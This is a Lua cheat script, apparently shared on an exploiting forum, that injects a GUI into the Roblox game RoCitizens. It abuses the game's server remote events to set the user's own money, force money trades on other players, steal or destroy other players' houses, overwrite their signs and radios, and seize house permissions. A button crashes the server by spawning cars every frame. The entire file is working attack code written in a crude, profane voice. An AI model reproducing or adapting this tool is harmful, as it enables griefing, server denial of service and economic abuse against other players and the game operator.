-- Made by FalconPunch: https://v3rmillion.net/member.php?action=profile&uid=415071
-- Don't modify the script to steal money, thats fucked up beyond belief you fucking Satan's child

-- This script is very buggy on Shitapse.

--[[
ToDo:
1) Option to prevent other exploiters using this gui from destroying your house.
]]
local Obj = nil
local Succ = pcall(function()
 Obj = game:GetObjects("rbxassetid://1315335901")
 Obj[1].Parent = game.CoreGui
end)
if not Succ or Obj == nil then
 Obj = getobjects(game, "rbxassetid://1315335901")
 Obj[1].Parent = game.CoreGui
end

if Obj == nil then
 error("YOUR EXPLOIT CAN'T USE GETOBJECTS.")
end

local serv = setmetatable({}, {
 __index = function(t, k)
  return game:GetService(k)
 end
})

local Plrs = serv.Players
local Run = serv.RunService
local RepStor = serv.ReplicatedStorage
local CoreGui = serv.CoreGui
local UserInput = serv.UserInputService
local Http = serv.HttpService

if game.PlaceId ~= 137877687 then
 local Hint = Instance.new("Hint", CoreGui)
 Hint.Text = "You fucking idiot, you need to be playing RoCitizens for this GUI"
 wait(10)
 Hint:Destroy()
 script.Parent:Destroy()
end

local MyPlr = Plrs.LocalPlayer
local MyChar = MyPlr.Character
warn("Waiting for MyMoney")
local MyMoney do
 repeat wait() until MyPlr:FindFirstChild("Money")
end
MyMoney = MyPlr.Money

warn("Waiting for ChangMoney")
local ChangeMoney do
 repeat wait() until MyPlr:FindFirstChild("ChangeMoney")
end
ChangeMoney = MyPlr.ChangeMoney

local RoCitizensGUI = CoreGui.RoCitizens

local ComRelay = workspace.CommunicationRelays
local CTrades = workspace.CurrentTrades
local SelectedPlayer = Plrs:GetPlayers()[math.random(1, #Plrs:GetPlayers())]
RoCitizensGUI.Main.Players.Title.Text = "Current Selected Player: " .. SelectedPlayer.Name

local PermsExploit = false
local ExplosivesExploit = false
local LockpickExploit = false
local AntiHouseDestroy = false
local AntiHouseStealSign = nil

function format_int(Num)
 local i, j, minus, int, fraction = tostring(Num):find("([-]?)(%d+)([.]?%d*)")
 
 int = int:reverse():gsub("(%d%d%d)", "%1,")
 
 return minus .. int:reverse():gsub("^,", "") .. fraction
end

function FindPlayer(Str)
 local Plr = { }
 for _, v in pairs(Plrs:GetPlayers()) do
  if string.lower(string.sub(v.Name, 1, string.len(Str))) == string.lower(Str) then
   table.insert(Plr, v)
  end
 end
 if #Plr == 1 then
  return Plr[1]
 else
  return nil
 end
end

function FindPlayersWithAHouse()
 local Players = { }
 local Properties = { }
 for _, v in next, workspace:GetChildren() do
  if v:IsA("Model") and v.Name == "Property" then
   table.insert(Properties, v:GetChildren())
  end
 end
 for _, v in next, Properties do
  local Find = v[1]:FindFirstChild("Owner")
  if Find then
   local FindPlr = Plrs:FindFirstChild(Find.Value)
   if FindPlr and FindPlr:IsA("Player") then
    table.insert(Players, FindPlr)
   end
  end
 end
 if #Players <= 0 then
  Players = nil
 end
 
 return Players
end

function FindEmptyProperty(Prop)
 local Properties = { }
 
 for _, v in next, workspace:GetChildren() do
  if v.Name == "Property" then
   local House = v:GetChildren()
   local GetPos = Vector3.new(Prop[1], Prop[2], Prop[3])
   if (House[1].Base.Position - GetPos).magnitude < 5 then
    local Find = House[1]:FindFirstChild("Owner")
    if not Find then
     table.insert(Properties, v)
    else
     workspace.CommunicationRelays.House.ResetProperty:FireServer(House[1])
     table.insert(Properties, v)
    end
   end
  end
 end
 
 return Properties
end

function FindHouse(Plr)
 local Properties = { }
 for _, v in next, workspace:GetChildren() do
  if v:IsA("Model") and v.Name == "Property" then
   table.insert(Properties, v:GetChildren())
  end
 end
 for _, v in next, Properties do
  local Find = v[1]:FindFirstChild("Owner")
  if Find then
   if Find.Value == Plr.Name then
    return v[1]
   end
  end
 end
 
 return nil
end

function GeneratePermsTable(Plr)
 local Tab = { }
 for _, v in next, Plrs:GetPlayers() do
  if v ~= Plr and v ~= MyPlr then
   Tab[v.Name] = {["Ban"] = false, ["Paint"] = false, ["Door"] = false}
  elseif v ~= Plr and v == MyPlr then
   Tab[v.Name] = {["Ban"] = false, ["Paint"] = true, ["Door"] = true}
  end
 end
 
 return Tab
end

function FlipLightSwitches(House)
 local StaticAssets = House.StaticAssets
 for _, v in next, StaticAssets:GetDescendants() do
  if v.Name == "SwitchV2" then
   ComRelay.Interaction.LightInteractV2:FireServer(v)
  end
 end
end

function OpenDoors(House)
 local StaticAssets = House.StaticAssets
 for _, v in next, StaticAssets:GetDescendants() do
  if v.Name == "Door" or v.Name == "GlassDoor" then
   ComRelay.Interaction.DoorInteract:FireServer(v)
  end
 end
end

function SendMessage(Plr, Msg) --ez
 ComRelay.Interclient.SendMessage:InvokeServer(Msg, Plr.Name)
end

function BuildHouse(Plr)
 local Building = true
 local Hint = Instance.new("Hint", CoreGui)
 Hint.Text = "Stealing house... This could take a while... and you might lag...)"
 SendMessage(Plr, "I stole your house. To get it back: reset character, and spawn it in again. I'm Sowwy. :(")
 local GetHouse = FindHouse(Plr)
 if not GetHouse then
  Hint.Text = "That player doesn't have a house!"
  wait(7)
  Hint:Destroy()
  return
 end
 
 MyPlr.Character.HumanoidRootPart.CFrame = CFrame.new(GetHouse.PrimaryPart.Position + Vector3.new(0, 5, 0))
 repeat wait() until GetHouse.StaticAssets:FindFirstChild("Furniture")
 local GetFurniture = GetHouse.StaticAssets:FindFirstChild("Furniture")
 local TempFurniture = Instance.new("Folder", MyPlr)
 TempFurniture.Name = "TempFurniture"
 local GetColors = GetHouse.AestheticChanger.UpdateRequested
 local Table = { }
 Table["HouseType"] = GetHouse.Name
 Table["Furniture"] = { }
 Table["Variables"] = { }
 for i, v in next, GetFurniture:GetChildren() do
  local Clo = v:clone()
  Clo.Parent = TempFurniture
 end
 for i, v in next, GetColors:GetChildren() do
  Table["Variables"][v.Name] = v.Value
 end
 
 ComRelay.House.ResetProperty:FireServer(GetHouse)
 ComRelay.HomePurchase.House:InvokeServer(GetHouse.Parent, Table)
 AntiHouseDestroy = false
 RoCitizensGUI.Main.Functions.Func16.AntiD.Text = "OFF"
 RoCitizensGUI.Main.Functions.Func16.AntiD.TextColor3 = Color3.new(1, 0, 0)
 
 GetHouse = FindHouse(MyPlr)
 for i, v in next, TempFurniture:GetChildren() do
  Hint.Text = "Stealing house... placing furniture " .. i .. "/" .. #TempFurniture:GetChildren()
  local Item = v:FindFirstChild("Item")
  local Color = v:FindFirstChild("Color")
  if Item and Color then
   local Furn = workspace.CommunicationRelays.House.PlaceFurniture:InvokeServer(v.Name, v.PrimaryPart.CFrame, GetHouse, Item.Value, Color.Value)
   if v.Name == "SS_Wooden Sign" then
    workspace.CommunicationRelays.Interaction.EditSign:FireServer(Furn, v.Plaque.SurfaceGui.TextLabel.Text)
   end
  else
   local Color1 = v:FindFirstChild("Color1")
   local Color2 = v:FindFirstChild("Color2")
   local Display = v:FindFirstChild("Display")
   if Color1 and Color2 and Display then
    workspace.CommunicationRelays.House.PlaceFurniture:InvokeServer(v.Name, v.PrimaryPart.CFrame, GetHouse, Item.Value, {["Display"] = Display.Value, ["Color1"] = Color1.Value, ["Color2"] = Color2.Value})
   end
  end
  game:GetService("RunService").RenderStepped:wait()
 end

 TempFurniture:Destroy()

 MyPlr.PlayerGui.Main.MyHouse.Value = GetHouse

 FlipLightSwitches(GetHouse)
 Building = false

 Hint.Text = "House copied, and spawned. Place some furniture to save it to server."
 wait(10)
 Hint:Destroy()
end

function DestroyHouse(Plr, House)
 if House == nil then
  House = FindHouse(Plr)
 end
 
 if House ~= nil then
  MyPlr.Character.HumanoidRootPart.CFrame = CFrame.new(House.Base.Position + Vector3.new(0, 5, 0))
  repeat
   MyPlr.Character.HumanoidRootPart.CFrame = CFrame.new(House.Base.Position + Vector3.new(0, 5, 0))
   Run.RenderStepped:wait()
  until House.StaticAssets:FindFirstChild("Furniture")
  local Furn = House.StaticAssets.Furniture
  
  for _, v in next, Furn:GetChildren() do
   if v.Name == "SS_Wooden Sign" then
    if v.Plaque.SurfaceGui.TextLabel.Text == "can't steal house" then
     local Hint = Instance.new("Hint", CoreGui)
     Hint.Text = "CANNOT DESTROY " .. Plr.Name .. "'s HOUSE THEIR ALSO USING THIS GUI <3"
     wait(10)
     Hint:Destroy()
     return
    end
   end
  end
  
  ComRelay.House.ResetProperty:FireServer(House)
  
  local Hint = Instance.new("Hint", CoreGui)
  Hint.Text = "Destroyed: " .. SelectedPlayer.Name .. "'s house. You fucking dick."
  wait(10)
  Hint:Destroy()
  
  if Plr == MyPlr then
   MyPlr.PlayerGui.Main.MyHouse.Value = nil
  end
 end
end

function DonateExploit(Plr, Amount)
 local Hint = Instance.new("Hint", CoreGui)
 Hint.Text = "Sent " .. Plr.Name .. " a trade request. Awaiting response..."
 if Plr.Money.Value == Amount or Plr.Money.Value > Amount then
  Hint.Text = "Unable to trade, " .. Plr.Name .. " already has that amount of money!"
  wait(7)
  Hint:Destroy()
 else
  local Response, TradeId = ComRelay.Interclient.RequestTrade:InvokeServer(Plr.Name)
  if Response and Response == "Accept" then
   Hint.Text = "Trade accepted, and hacked donation amount awaiting " .. Plr.Name .. "'s response."
   local Math = (Amount - Plr.Money.Value)
   ComRelay.Interclient.TradeStart:InvokeServer(Plr.Name, TradeId)
   ComRelay.Interclient.TradeUpdate:InvokeServer(TradeId, Math, "Money")
   repeat wait() until CTrades:FindFirstChild(TradeId)
   repeat
    ComRelay.Interclient.TradeAccept:FireServer(TradeId)
    wait(1)
   until not CTrades:FindFirstChild(TradeId)
   Hint.Text = "Sent " .. Plr.Name .. " $" .. format_int(Math)
   wait(5)
   Hint:Destroy()
  elseif Response == "Busy" then
   Hint.Text = Plr.Name .. " is busy with another trade."
   wait(6)
   Hint:Destroy()
  else
   Hint.Text = Plr.Name .. " declined trade. Money not sent."
   wait(5)
   Hint:Destroy()
  end
 end
end

function StealHouse()
 local IHaveAHouse = FindHouse(MyPlr)
 if IHaveAHouse then
  DestroyHouse(MyPlr, IHaveAHouse)
 end
 BuildHouse(SelectedPlayer)
end

function EquipItem(Item)
 ComRelay.Character.ItemEquip:FireServer("JobAssets", Item, Item)
end

function SaveHouse(HouseName)
 local GetHouse = FindHouse(SelectedPlayer)
 if not GetHouse then
  return
 end
 
 MyChar.HumanoidRootPart.CFrame = CFrame.new(GetHouse.PrimaryPart.Position + Vector3.new(0, 5, 0))
 repeat
  MyChar.HumanoidRootPart.CFrame = CFrame.new(GetHouse.PrimaryPart.Position + Vector3.new(0, 5, 0))
  wait()
 until GetHouse.StaticAssets:FindFirstChild("Furniture")
 local Furn = GetHouse.StaticAssets.Furniture
 local Colors = GetHouse.AestheticChanger.UpdateRequested
 
 local SaveData = { }
 SaveData["HouseType"] = GetHouse.Name
 SaveData["Furniture"] = { } -- Going to be nil.
 SaveData["Variables"] = { }
 SaveData["FurnData"] = { }
 SaveData["Prop"] = {GetHouse.Base.Position.X, GetHouse.Base.Position.Y, GetHouse.Base.Position.Z}
 
 for i, v in next, Furn:GetChildren() do
  SaveData["FurnData"][v.Name .. i] = { }
  local Item, Color = v:FindFirstChild("Item"), v:FindFirstChild("Color")
  if Item and Color then
   SaveData["FurnData"][v.Name .. i]["Name"] = v.Name
   SaveData["FurnData"][v.Name .. i]["Item"] = Item.Value
   SaveData["FurnData"][v.Name .. i]["Color"] = Color.Value
   SaveData["FurnData"][v.Name .. i]["CFrame"] = {v.PrimaryPart.CFrame:components()}
   if v.Name == "SS_Wooden Sign" then
    SaveData["FurnData"][v.Name .. i]["Text"] = v.Plaque.SurfaceGui.TextLabel.Text
   end
  else
   local Color1 = v:FindFirstChild("Color1")
   local Color2 = v:FindFirstChild("Color2")
   local Display = v:FindFirstChild("Display")
   local Item = v:FindFirstChild("Item")
   if Color1 and Color2 and Display and Item then
    SaveData["FurnData"][v.Name .. i]["Item"] = Item.Value
    SaveData["FurnData"][v.Name .. i]["Color1"] = Color1.Value
    SaveData["FurnData"][v.Name .. i]["Color2"] = Color2.Value
    SaveData["FurnData"][v.Name .. i]["Display"] = Display.Value
    SaveData["FurnData"][v.Name .. i]["CFrame"] = {v.PrimaryPart.CFrame:components()}
   end
  end
 end
 
 for _, v in next, Colors:GetChildren() do
  SaveData["Variables"][v.Name] = v.Value
 end
 
 
 pcall(function() writefile(HouseName .. ".txt", Http:JSONEncode(SaveData)) end)
 pcall(function() Synapse:WriteFile(HouseName .. ".txt", Http:JSONEncode(SaveData)) end)
 local hint = Instance.new("Hint", game.CoreGui)
 hint.Text = "House Saved to file: " .. HouseName
 wait(5)
 hint:Destroy()
end

function LoadHouse(HouseName)
 local Hint = Instance.new("Hint", CoreGui)
 Hint.Text = "Loading house: " .. HouseName
 
 local HouseData = nil
 local Succ = pcall(function() HouseData = readfile(HouseName .. ".txt") end)
 if not Succ then
  local Succ2 = pcall(function() HouseData = readfile(HouseName .. ".txt") end)
  if not Succ2 then
   Hint:Destroy()
   return
  end
 end
 
 HouseData = Http:JSONDecode(HouseData)
 
 local GetAProperty = FindEmptyProperty(HouseData.Prop)
 if #GetAProperty > 1 then
  GetAProperty = GetAProperty[math.random(1, #GetAProperty)]
 else
  GetAProperty = GetAProperty[1]
 end
 
 if GetAProperty == nil then
  return
 end
 local GetHouse = FindHouse(MyPlr)
 if GetHouse then
  ComRelay.House.ResetProperty:FireServer(GetHouse)
  AntiHouseDestroy = false
  RoCitizensGUI.Main.Functions.Func16.AntiD.Text = "OFF"
  RoCitizensGUI.Main.Functions.Func16.AntiD.TextColor3 = Color3.new(1, 0, 0)
 end
 
 workspace.CommunicationRelays.HomePurchase.House:InvokeServer(GetAProperty, {["HouseType"] = HouseData["HouseType"], ["Furniture"] = { }, ["Variables"] = HouseData["Variables"]})
 
 wait(0.5)
 
 GetHouse = FindHouse(MyPlr)
 local Num = 1
 for i, v in next, HouseData.FurnData do
  Hint.Text = "Loading house: " .. HouseName .. " " .. Num .. "/" .. #HouseData.FurnData
  if v.Color ~= nil then
   local C = CFrame.new(v.CFrame[1], v.CFrame[2], v.CFrame[3], v.CFrame[4], v.CFrame[5], v.CFrame[6], v.CFrame[7], v.CFrame[8], v.CFrame[9], v.CFrame[10], v.CFrame[11], v.CFrame[12])
   local sexy_bitch = workspace.CommunicationRelays.House.PlaceFurniture:InvokeServer(v.Name, C, GetHouse, v.Item, v.Color)
   if sexy_bitch.Name == "SS_Wooden Sign" then
    ComRelay.Interaction.EditSign:FireServer(sexy_bitch, v.Text)
   end
  else
   local C = CFrame.new(v.CFrame[1], v.CFrame[2], v.CFrame[3], v.CFrame[4], v.CFrame[5], v.CFrame[6], v.CFrame[7], v.CFrame[8], v.CFrame[9], v.CFrame[10], v.CFrame[11], v.CFrame[12])
   ComRelay.House.PlaceFurniture:InvokeServer(v.Name, C, GetHouse, v.Item, {["Display"] = v.Display, ["Color1"] = v.Color1, ["Color2"] = v.Color2})
  end
  Num = Num + 1
 end
 MyPlr.PlayerGui.Main.MyHouse.Value = GetHouse
 MyChar.HumanoidRootPart.CFrame = CFrame.new(GetHouse.PrimaryPart.Position + Vector3.new(0, 5, 0))
 Hint.Text = "House loaded. :)"
 wait(5)
 Hint:Destroy()
end

RoCitizensGUI.Main.Players.Players.PlayerBOX.FocusLost:connect(function()
 local Plr = FindPlayer(RoCitizensGUI.Main.Players.Players.PlayerBOX.Text)
 if Plr then
  SelectedPlayer = Plr
  RoCitizensGUI.Main.Players.Players.PlayerBOX.Text = Plr.Name
  RoCitizensGUI.Main.Players.Title.Text = "Current Selected Player: " .. Plr.Name
 else
  RoCitizensGUI.Main.Players.Players.PlayerBOX.Text = "Enter Player Name"
 end
end)

RoCitizensGUI.Main.Players.Players.AllPlayers.MouseButton1Click:connect(function()
 SelectedPlayer = "Everyone"
 RoCitizensGUI.Main.Players.Title.Text = "Current Selected Player: Everyone"
end)

RoCitizensGUI.Main.Functions.Func3.Teleport.MouseButton1Click:connect(function()
 local MyChar = MyPlr.Character
 local TheirChar = nil
 if SelectedPlayer ~= "Everyone" then
  TheirChar = SelectedPlayer.Character
  if MyChar and TheirChar then
   local MyTor = MyChar.HumanoidRootPart
   local TheirTor = TheirChar.HumanoidRootPart
   MyTor.CFrame = TheirTor.CFrame * CFrame.new(Vector3.new(0, 0, 2))
  end
 else
  local Hint = Instance.new("Hint", CoreGui)
  Hint.Text = "Selected Player cannot be everyone!"
  wait(5)
  Hint:Destroy()
 end
end)

RoCitizensGUI.Main.Functions.Func1.MoneyBox.FocusLost:connect(function()
 local Num = tonumber(RoCitizensGUI.Main.Functions.Func1.MoneyBox.Text) or 0
 if Num > 2147483647 then
  Num = 2147483647
 end
 if Num < -2147483647 then
  Num = -2147483647
 end
 RoCitizensGUI.Main.Functions.Func1.MoneyVal.Value = Num
 
 RoCitizensGUI.Main.Functions.Func1.MoneyBox.Text = "$" .. format_int(Num)
end)

RoCitizensGUI.Main.Functions.Func2.MoneyBox.FocusLost:connect(function()
 local Num = tonumber(RoCitizensGUI.Main.Functions.Func2.MoneyBox.Text) or 0
 if Num > 2147483647 then
  Num = 2147483647
 end
 if Num < 0 then -- Don't be a fucking dick head .
  Num = 1
 end

 RoCitizensGUI.Main.Functions.Func2.MoneyVal.Value = Num
 
 RoCitizensGUI.Main.Functions.Func2.MoneyBox.Text = "$" .. format_int(Num)
end)

RoCitizensGUI.Main.Functions.Func1.SetMoney.MouseButton1Click:connect(function()
 local Math = RoCitizensGUI.Main.Functions.Func1.MoneyVal.Value - MyMoney.Value
 ChangeMoney:Fire(Math)
end)

RoCitizensGUI.Main.Functions.Func2.SendMoney.MouseButton1Click:connect(function()
 if SelectedPlayer ~= "Everyone" and SelectedPlayer ~= MyPlr then
  DonateExploit(SelectedPlayer, RoCitizensGUI.Main.Functions.Func2.MoneyVal.Value)
 else
  for _, v in next, Plrs:GetPlayers() do
   if v ~= MyPlr then
    if v:FindFirstChild("Money") then
     DonateExploit(v, RoCitizensGUI.Main.Functions.Func2.MoneyVal.Value)
    end
   end
  end
 end
end)

RoCitizensGUI.Main.Functions.Func4.Teleport.MouseButton1Click:connect(function()
 if SelectedPlayer ~= "Everyone" and SelectedPlayer ~= MyPlr then
  StealHouse()
 else
  local Hint = Instance.new("Hint", CoreGui)
  Hint.Text = "Cannot steal everyone's house!"
  wait(5)
  Hint:Destroy()
 end
end)

RoCitizensGUI.Main.Functions.Func5.DestroyBut.MouseButton1Click:connect(function()
 DestroyHouse(SelectedPlayer)
end)

RoCitizensGUI.Main.Functions.Func6.Change.MouseButton1Click:connect(function()
 local id = tonumber(RoCitizensGUI.Main.Functions.Func6.AudioBox.Text) or 856173428
 
 local MyChar = MyPlr.Character
 local MyTor = MyChar.HumanoidRootPart
 local SavePos = MyTor.CFrame
 
 local GetHousePlrs = FindPlayersWithAHouse()
 for _, v in next, GetHousePlrs do
  local TheirHouse = FindHouse(v)
  if TheirHouse then
   MyTor.CFrame = CFrame.new(TheirHouse.Base.Position + Vector3.new(0, 6, 0))
   repeat
    if not TheirHouse:FindFirstChild("Owner") then
     break
    end
    MyTor.CFrame = CFrame.new(TheirHouse.Base.Position + Vector3.new(0, 6, 0))
    Run.RenderStepped:wait()
   until TheirHouse.StaticAssets:FindFirstChild("Furniture")
   if not TheirHouse:FindFirstChild("Owner") then
    return
   end
   for _, vv in next, TheirHouse.StaticAssets.Furniture:GetChildren() do
    if vv.Name:find("VC_Radio") or vv.Name:find("VC_Stereo") then
     ComRelay.Interaction.ChangeSound:FireServer(vv, tostring(id))
     game.StarterGui.RoRadio.RemoveSystem:Fire(vv)
    end
   end
  end
 end
 
 MyTor.CFrame = SavePos
end)

RoCitizensGUI.Main.Functions.Func14.SignsB.MouseButton1Click:connect(function()
 local MyChar = MyPlr.Character
 local MyTor = MyChar.HumanoidRootPart
 local SavePos = MyTor.CFrame
 
 local GetHousePlrs = FindPlayersWithAHouse()
 for _, v in next, GetHousePlrs do
  local TheirHouse = FindHouse(v)
  if TheirHouse then
   MyTor.CFrame = CFrame.new(TheirHouse.Base.Position + Vector3.new(0, 6, 0))
   repeat
    if not TheirHouse:FindFirstChild("Owner") then
     break
    end
    MyTor.CFrame = CFrame.new(TheirHouse.Base.Position + Vector3.new(0, 6, 0))
    Run.RenderStepped:wait()
   until TheirHouse.StaticAssets:FindFirstChild("Furniture")
   if not TheirHouse:FindFirstChild("Owner") then
    return
   end
   for _, vv in next, TheirHouse.StaticAssets.Furniture:GetChildren() do
    if vv.Name == "SS_Wooden Sign" then
     ComRelay.Interaction.EditSign:FireServer(vv, RoCitizensGUI.Main.Functions.Func14.SignsText.Text)
    end
   end
  end
 end
 
 MyTor.CFrame = SavePos
end)

RoCitizensGUI.Main.Functions.Func7.Permissions.MouseButton1Click:connect(function()
 PermsExploit = not PermsExploit
 if PermsExploit then
  RoCitizensGUI.Main.Functions.Func7.Permissions.Text = "ON"
  RoCitizensGUI.Main.Functions.Func7.Permissions.TextColor3 = Color3.new(0, 1, 0)
 else
  RoCitizensGUI.Main.Functions.Func7.Permissions.Text = "OFF"
  RoCitizensGUI.Main.Functions.Func7.Permissions.TextColor3 = Color3.new(1, 0, 0)
 end
end)

RoCitizensGUI.Main.Functions.Func8.Lockpick.MouseButton1Click:connect(function()
 LockpickExploit = not LockpickExploit
 ExplosivesExploit = false
 if LockpickExploit then
  RoCitizensGUI.Main.Functions.Func8.Lockpick.Text = "ON"
  RoCitizensGUI.Main.Functions.Func8.Lockpick.TextColor3 = Color3.new(0, 1, 0)
  RoCitizensGUI.Main.Functions.Func9.Explosives.Text = "OFF"
  RoCitizensGUI.Main.Functions.Func9.Explosives.TextColor3 = Color3.new(1, 0, 0)
 else
  RoCitizensGUI.Main.Functions.Func8.Lockpick.Text = "OFF"
  RoCitizensGUI.Main.Functions.Func8.Lockpick.TextColor3 = Color3.new(1, 0, 0)
 end
end)

RoCitizensGUI.Main.Functions.Func9.Explosives.MouseButton1Click:connect(function()
 ExplosivesExploit = not ExplosivesExploit
 LockpickExploit = false
 if ExplosivesExploit then
  RoCitizensGUI.Main.Functions.Func9.Explosives.Text = "ON"
  RoCitizensGUI.Main.Functions.Func9.Explosives.TextColor3 = Color3.new(0, 1, 0)
  RoCitizensGUI.Main.Functions.Func8.Lockpick.Text = "OFF"
  RoCitizensGUI.Main.Functions.Func8.Lockpick.TextColor3 = Color3.new(1, 0, 0)
 else
  RoCitizensGUI.Main.Functions.Func9.Explosives.Text = "OFF"
  RoCitizensGUI.Main.Functions.Func9.Explosives.TextColor3 = Color3.new(1, 0, 0)
 end
end)

RoCitizensGUI.Main.Functions.Func10.Clothes.MouseButton1Click:connect(function()
 for _, v in next, RepStor.Shirt:GetChildren() do
  MyPlr.PlayerGui.GameValues.CosmeticData.AddItem:Invoke(v.Name)
 end
 for _, v in next, RepStor.Pants:GetChildren() do
  MyPlr.PlayerGui.GameValues.CosmeticData.AddItem:Invoke(v.Name)
 end
 for _, v in next, RepStor.Hair:GetChildren() do
  MyPlr.PlayerGui.GameValues.CosmeticData.AddItem:Invoke(v.Name)
 end
 for _, v in next, RepStor.Hat:GetChildren() do
  MyPlr.PlayerGui.GameValues.CosmeticData.AddItem:Invoke(v.Name)
 end
 for _, v in next, RepStor.Glasses:GetChildren() do
  MyPlr.PlayerGui.GameValues.CosmeticData.AddItem:Invoke(v.Name)
 end
end)

RoCitizensGUI.Main.Functions.Func11.Furniture.MouseButton1Click:connect(function()
 local FurnGUI = MyPlr.PlayerGui.Main.Field.Panel2.Inventory.FurnitureFrame
 for _, v in next, RepStor.Furniture:GetChildren() do
  local Clo = v:clone()
  Clo.Parent = FurnGUI
  Clo.Visible = true
  print(Clo:GetFullName())
 end
end)

RoCitizensGUI.Main.Functions.Func12.HouseName.ClearTextOnFocus = false
RoCitizensGUI.Main.Functions.Func12.HouseSave.MouseButton1Click:connect(function()
 SaveHouse(RoCitizensGUI.Main.Functions.Func12.HouseName.Text)
end)

RoCitizensGUI.Main.Functions.Func13.HouseName.ClearTextOnFocus = false
RoCitizensGUI.Main.Functions.Func13.HouseLoad.MouseButton1Click:connect(function()
 LoadHouse(RoCitizensGUI.Main.Functions.Func13.HouseName.Text)
end)

RoCitizensGUI.Main.Functions.Func15.CrashB.MouseButton1Click:connect(function()
 local Hint = Instance.new("Hint", CoreGui)
 Hint.Text = "May take a few minutes to completely crash the server."
 for i = 0, 5 do
  Run:BindToRenderStep("HAX" .. i, Enum.RenderPriority.First.Value-1, function()
   ComRelay.Car.SpawnCar:InvokeServer({["SpawnLocation"] = "Dealership", ["CurrentSpecs"] = {["Hood"] = "Standard", ["Spoiler"] = "None", ["SpoilerColor"] = "Mid gray", ["PrimaryColor"] = "Medium blue", ["SkirtsColor"] = "Mid gray", ["Price"] = 4400, ["Initiate"] = false, ["Skirts"] = "None", ["Frame"] = "Intrepid", ["SecondaryColor"] = "Medium stone grey", ["RimColor"] = "Medium stone grey"}})
  end)
 end
end)

RoCitizensGUI.Main.Functions.Func16.AntiD.MouseButton1Click:connect(function()
 AntiHouseDestroy = not AntiHouseDestroy
 if AntiHouseDestroy then
  local GetHouse = FindHouse(MyPlr)
  if not GetHouse then
   return
  end
  -- v.Name, C, GetHouse, v.Item, v.Color
  local Furn = RepStor.FurnitureModels["SS_Wooden Sign"]
  AntiHouseStealSign = ComRelay.House.PlaceFurniture:InvokeServer(Furn.Name, CFrame.new(Vector3.new(0, -5, 0)), GetHouse, "Splinter Sale Wooden Sign", "Reddish brown")
  ComRelay.Interaction.EditSign:FireServer(AntiHouseStealSign, "can't steal house")
  
  local Hint = Instance.new("Hint", CoreGui)
  Hint.Text = "DO NOT DESTROY THE SIGN THAT WAS JUST SPAWNED IN."
  RoCitizensGUI.Main.Functions.Func16.AntiD.Text = "ON"
  RoCitizensGUI.Main.Functions.Func16.AntiD.TextColor3 = Color3.new(0, 1, 0)
  wait(8)
  Hint:Destroy()
 else
  ComRelay.House.RemoveFurniture:InvokeServer(AntiHouseStealSign)
  AntiHouseStealSign = nil
  RoCitizensGUI.Main.Functions.Func16.AntiD.Text = "OFF"
  RoCitizensGUI.Main.Functions.Func16.AntiD.TextColor3 = Color3.new(1, 0, 0)
 end
end)


UserInput.InputBegan:connect(function(input, ingui)
 if not ingui then
  if input.UserInputType == Enum.UserInputType.Keyboard then
   if input.KeyCode == Enum.KeyCode.P then
    RoCitizensGUI.Main.Visible = not RoCitizensGUI.Main.Visible
   end
  end
 end
end)

Plrs.PlayerRemoving:connect(function(Plr)
 if Plr == SelectedPlayer then
  SelectedPlayer = Plrs:GetPlayers()[math.random(1, #Plrs:GetPlayers())]
  RoCitizensGUI.Main.Players.Title.Text = "Current Selected Player: " .. SelectedPlayer.Name
 end
end)


coroutine.resume(coroutine.create(function()
 while true do
  if PermsExploit then
   for _, v in next, Plrs:GetPlayers() do
    if v ~= MyPlr then
     local House = FindHouse(v)
     if House then
      ComRelay.House.SetPermissions:FireServer(GeneratePermsTable(v), House)
     end
    end
    Run.RenderStepped:wait()
   end
  end
  if LockpickExploit then
   EquipItem("Lock Kit")
  end
  if ExplosivesExploit then
   EquipItem("Bomb")
  end
  wait(1)
 end
end))